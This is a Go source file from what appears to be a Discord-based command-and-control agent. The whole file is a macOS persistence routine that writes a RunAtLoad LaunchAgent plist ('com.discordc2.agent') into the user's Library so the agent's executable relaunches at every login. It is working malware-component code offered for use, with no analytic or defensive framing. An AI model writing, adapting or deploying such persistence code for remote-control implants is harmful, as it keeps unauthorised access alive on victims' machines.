//go:build darwin

package darwin

import (
	"fmt"
	"os"
	"path/filepath"
)

// InstallPersistence installs the agent as a LaunchAgent.
func (p *DarwinPlatform) InstallPersistence() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", err
	}

	agentDir := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
	if err := os.MkdirAll(agentDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	plistPath := filepath.Join(agentDir, "com.discordc2.agent.plist")
	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.discordc2.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>%s</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
`, exePath)

	err = os.WriteFile(plistPath, []byte(plistContent), 0644)
	if err != nil {
		return "", fmt.Errorf("failed to write LaunchAgent plist file: %w", err)
	}

	return fmt.Sprintf("Persistence installed successfully. Plist file at %s", plistPath), nil
}
